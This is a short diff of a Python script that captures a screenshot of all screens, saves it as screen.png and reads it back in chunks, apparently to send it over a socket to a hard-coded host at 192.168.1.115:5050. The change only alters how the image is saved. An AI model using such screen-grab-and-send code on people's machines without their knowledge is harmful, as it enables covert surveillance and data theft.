@@ -7,12 +7,9 @@ import socket
 s = socket.socket()
 s.connect(("192.168.1.115",5050))
 
-file = open('screen.png', 'w')
-
 screenshot = ImageGrab.grab(all_screens=True)
-screenshot.save(file, 'PNG')
-
-file.close()
+screenshot.save('screen.png')
+screenshot.close()
 
 f = open ('screen.png', "rb")
 l = f.read(1024)
